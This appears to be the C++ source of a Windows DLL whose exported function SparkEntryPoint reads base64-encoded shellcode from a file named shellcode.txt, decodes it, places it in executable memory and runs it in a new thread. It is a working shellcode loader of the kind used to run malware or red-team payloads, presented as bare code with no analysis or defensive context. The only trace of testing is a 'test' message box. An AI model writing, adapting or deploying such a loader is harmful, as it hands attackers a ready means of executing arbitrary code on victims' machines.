#include "pch.h"
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>
#include <windows.h>
#include <cstdio>
#include <fstream>
#include <sstream>

const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";


std::string ReadFileToString(const std::string& path) {
    std::ifstream file(path, std::ios::in);
    if (!file.is_open())
        return "";

    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

std::vector<unsigned char> Base64Decode(const std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    auto is_base64 = [](unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
        };

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (int j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (int j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int j = 0; j < i - 1; j++)
            ret.push_back(char_array_3[j]);
    }

    return ret;
}


extern "C" {

    __declspec(dllexport)
        int SparkEntryPoint(int a, int b) {
        std::string encoded = ReadFileToString("shellcode.txt");
        if (encoded.empty())
            return -1;

        std::vector<unsigned char> shellcode = Base64Decode(encoded);
        if (shellcode.empty())
            return -1;

        SIZE_T lenShell = shellcode.size();
        LPVOID shell = VirtualAlloc(NULL, lenShell, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!shell) {
            std::cerr << "VirualAlloc failed!\n";
            return -1;
        }
        memcpy(shell, shellcode.data(), lenShell);

        MessageBoxA(NULL, "test", "test", MB_OK);
        HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shell, NULL, NULL, NULL);
        WaitForSingleObject(hThread, INFINITE);

        return 0;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



